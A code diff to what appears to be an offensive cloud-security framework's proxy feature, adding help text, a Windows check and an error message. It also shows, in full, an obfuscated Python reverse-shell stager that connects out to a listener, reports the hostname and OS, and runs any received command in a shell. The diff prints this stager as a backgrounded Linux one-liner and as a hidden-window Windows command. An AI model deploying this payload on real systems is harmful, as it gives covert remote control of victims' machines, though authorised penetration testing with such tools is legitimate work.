@@ -3,6 +3,7 @@ import copy
 import importlib
 import json
 import os
+import platform
 from queue import Queue
 import random
 import re
@@ -509,10 +510,10 @@ class Main:
             proxy_ssh_priv_key = proxy_settings.ssh_priv_key
             proxy_target_agent = copy.deepcopy(proxy_settings.target_agent)
 
-            if len(command) == 1:  # Display proxy help
+            if len(command) == 1 or (len(command) == 2 and command[1] == 'help'):  # Display proxy help
                 print("""
     PacuProxy command info:
-        proxy                               Control PacuProxy/display help
+        proxy [help]                        Control PacuProxy/display help
             start ip [port]                   Start the PacuProxy listener - port 80 by default.
                                                 The listener will attempt to start on the IP
                                                 supplied, but some hosts don't allow this. In
@@ -582,7 +583,7 @@ class Main:
                 if len(command) == 3:
                     python_stager = "import os,platform as I,socket as E,subprocess as B,time as t,sys as X,struct as D\\nV=True\\nY=t.sleep\\nclass A(object):\\n  def __init__(self):\\n    self.S='{}'\\n    self.p={}\\n    self.s=None\\n  def b(self):\\n    try:\\n      self.s=E.socket()\\n    except:\\n      pass\\n    return\\n  def c(self):\\n    try:\\n      self.s.connect((self.S,self.p))\\n    except:\\n      Y(5)\\n      raise\\n    try:\\n      self.s.send('{{}}\\{{}}'.format(I.system(),E.gethostname()).encode())\\n    except:\\n      pass\\n    return\\n  def d(self,R):\\n    Q=R.encode()\\n    self.s.send(D.pack('>I',len(Q))+Q)\\n    return\\n  def e(self):\\n    try:\\n      self.s.recv(10)\\n    except:\\n      return\\n    self.s.send(D.pack('>I',0))\\n    while V:\\n      R=None\\n      U=self.s.recv(20480)\\n      if U==b'': break\\n      elif U[:2].decode('utf-8')=='cd':\\n        P=U[3:].decode('utf-8')\\n        try:\\n          os.chdir(P.strip())\\n        except Exception as e:\\n          R='e:%s'%str(e)\\n        else:\\n          R=''\\n      elif U[:].decode('utf-8')=='q':\\n        self.s.close()\\n        X.exit(0)\\n      elif len(U)>0:\\n        try:\\n          T=B.Popen(U[:].decode('utf-8'),shell=V,stdout=B.PIPE,stderr=B.PIPE,stdin=B.PIPE)\\n          M=T.stdout.read()+T.stderr.read()\\n          R=M.decode('utf-8',errors='replace')\\n        except Exception as e:\\n          R='e:%s'%str(e)\\n      if R is not None:\\n        try:\\n          self.d(R)\\n        except:\\n          pass\\n    self.s.close()\\n    return\\ndef f():\\n  C=A()\\n  C.b()\\n  while V:\\n    try:\\n      C.c()\\n    except:\\n      Y(5)\\n    else:\\n      break\\n  try:\\n    C.e()\\n  except:\\n    pass\\n  C.s.close()\\n  return\\nX.stderr=object\\nwhile V:\\n  f()".format(proxy_ip, proxy_port)
                     if command[2] == 'lin':  # Linux one-liner (uses \" to escape inline double-quotes)
-                        self.print('python3 -c "{}"'.format("exec(\\\"\\\"\\\"{}\\\"\\\"\\\") &".format(python_stager)))
+                        self.print('python3 -c "{}" &'.format("exec(\\\"\\\"\\\"{}\\\"\\\"\\\")".format(python_stager)))
                     elif command[2] == 'win':  # Windows one-liner (uses `" to escape inline double-quotes)
                         self.print('START -WindowStyle hidden -FilePath "python3" -ArgumentList "-c","{}"'.format("exec(`\"`\"`\"{}`\"`\"`\")".format(python_stager)))
                     else:
@@ -596,6 +597,9 @@ class Main:
                             self.print('** No longer using a remote PacuProxy agent to route commands. **')
                             proxy_target_agent = []
                         else:
+                            if platform.system() == 'Windows':
+                                self.print('** Windows hosts do not currently support module proxying. Run the PacuProxy server on a Linux host for full module proxying capability. **')
+                                return
                             try:
                                 test = int(command[2])
                             except:
@@ -647,6 +651,8 @@ class Main:
                         self.print('** Invalid agent ID, expected an integer or "none": {} **'.format(error))
                 else:
                     self.print('** Incorrect input, excepted an agent ID, received: {}'.format(command[2:]))
+            else:
+                self.print('** Unrecognized proxy command: {} **'.format(command[1]))
             proxy_settings.update(self.database, ssh_username=proxy_ssh_username, ssh_priv_key=proxy_ssh_priv_key, listening=proxy_listening, target_agent=proxy_target_agent)
             return
         elif (command[0] == 'run' or command[0] == 'exec') and len(command) > 1:
